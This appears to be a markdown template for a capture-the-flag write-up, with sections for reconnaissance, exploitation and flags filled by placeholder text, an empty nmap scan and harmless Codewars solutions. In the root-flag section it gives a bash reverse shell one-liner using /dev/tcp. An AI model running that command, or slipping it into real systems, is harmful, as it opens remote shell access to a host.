# Information Gathering

## Nmap
We begin our reconnaissance by running an Nmap scan checking default scripts and testing for vulnerabilities.

```console
x@wartop:~$ nmap -sVC 192.168.100.6

Starting Nmap 7.01 ( https://nmap.org ) at 2019-08-11 08:57 PDT
Nmap scan report for 192.168.100.6 (192.168.100.1)
Host is up (0.022s latency).

```
From the above output we can see that ports, **22**, **53**, **81**, and **444** are the ports open. This is just an example to show code formatting so who cares.

Look  here's an image of my website, this is how you format an image.

Maybe we want to show some python code too, to let's take a look at a snipped from [codewars](https://www.codewars.com) to format time as human readable.

```python
def make_readable(seconds):        

    hours = seconds / 60**2
    minutes = seconds/60 - hours*60
    seconds = seconds - hours*(60**2) - minutes*60

    return '%02d:%02d:%02d' % (hours, minutes, seconds)
```


# Exploitation  

In order to gain our initial foothold we need to blablablabla. Here's another code snippet just for fun.

```php
function sqInRect($lng, $wdth) {

    if($lng == $wdth) {
      return null;
    }

    $squares = array();

    while($lng*$wdth >= 1) {
      if($lng>$wdth) {
        $base = $wdth;
        $lng = $lng - $base;
      }
      else {
        $base = $lng;
        $wdth = $wdth - $base;
      }
      array_push($squares, $base);
    }
    return $squares;
}
```
Above is the php code for the **Rectangle into Squares** kata solution from codewars.


## User Flag

In order to get the user flag, we simply need to use `cat`, because this is a template and not a real writeup!

```
x@wartop:~$ cat user.txt

```

## Root Flag

The privilege escalation for this box was not hard, because this is an example and I've got sudo password. Here's some code to call a reverse shell `bash -i >& /dev/tcp/127.0.0.1/4444 0>&1`.

# Conclusion
In the conclusion sections I like to write a little bit about how the box seemed to me overall, where I struggled, and what I learned.
